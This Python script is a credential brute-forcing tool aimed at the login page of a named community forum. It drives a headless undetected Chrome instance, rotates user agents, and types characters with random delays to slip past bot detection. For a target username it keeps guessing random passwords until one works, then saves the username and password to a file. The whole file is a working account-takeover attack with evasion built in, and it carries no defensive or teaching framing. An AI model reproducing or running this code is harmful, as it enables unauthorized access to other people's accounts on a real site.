import os
import random
import string
import sys
import time

import undetected_chromedriver as uc
from dotenv import load_dotenv
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

load_dotenv()

used_passwords = []
user_agents = []
# chrome_portable_path = os.getenv('CHROME_PORTABLE_PATH')
webdriver_path = os.getenv('WEBDRIVER_PATH')


def generate_password():
    # Define the character sets for the password
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase
    numbers = string.digits
    special_chars = '!%$#&/()=?*-.,;:_<>'
    all_chars = lowercase + uppercase + numbers + special_chars

    # Generate a password of random length (6-32 characters)
    password_length = random.randint(6, 32)
    password = ''
    for i in range(password_length):
        password += random.choice(all_chars)
    return password


def browser_task(username, tmp_password):
    # create a new Chrome browser instance
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--no-sandbox')

    # set a random user agent
    user_agent = random.choice(user_agents)
    options.add_argument(f'user-agent={user_agent}')

    browser = uc.Chrome(options=options, driver_executable_path=webdriver_path)
    # navigate to the website
    browser.get('https://community.primordial.dev/')

    # add random delay
    time.sleep(random.randint(2, 7))

    # find the login input field and enter username
    username_field = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="login"]'))
    )
    # username_field = browser.find_element_by_css_selector('input[name="login"]')
    for c in username:
        username_field.send_keys(c)
        time.sleep(random.randrange(1, 2))
    # username_field.send_keys(username)

    # add random delay
    time.sleep(random.randint(1, 3))

    # find the password input field and enter "123"
    password_field = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="password"]'))
    )
    # password_field.send_keys(tmp_password)
    for c in tmp_password:
        password_field.send_keys(c)
        time.sleep(random.randrange(1, 2))

    # add random delay
    time.sleep(random.randint(2, 4))

    # find and click the "Log in" button
    login_button = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, '.button--icon--login'))
    )
    login_button.click()

    # add random delay
    time.sleep(random.randint(3, 8))

    we_in = True
    if "login" in browser.current_url:
        we_in = False
        time.sleep(random.randint(1, 3))
        browser.refresh()
        if "login" in browser.current_url:
            we_in = False
    browser.close()
    time.sleep(3)
    return we_in


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    # read user agents from file
    if os.path.isfile('user_agents.txt'):
        with open('user_agents.txt') as f:
            user_agents = f.read().splitlines()
    if os.path.isfile('used_passwords.txt'):
        with open('used_passwords.txt') as f:
            used_passwords = f.read().splitlines()

    target = sys.argv[1]
    if os.path.isfile(f'{target}.txt'):
        print("Target already resolved!")
        sys.exit(2)
    else:
        used_passwords.clear()

    while True:
        first_pass = True
        regen_pass = False
        tmp_pass = ""
        while regen_pass or first_pass:
            tmp_pass = generate_password()
            first_pass = False
            for used_pass in used_passwords:
                if tmp_pass == used_pass:
                    regen_pass = True
                    break
        status = browser_task(target, tmp_pass)
        used_passwords.append(tmp_pass)
        if status:
            with open(f"{target}.txt", "w") as f:
                f.write(f"{target};{tmp_pass}\n")
            break
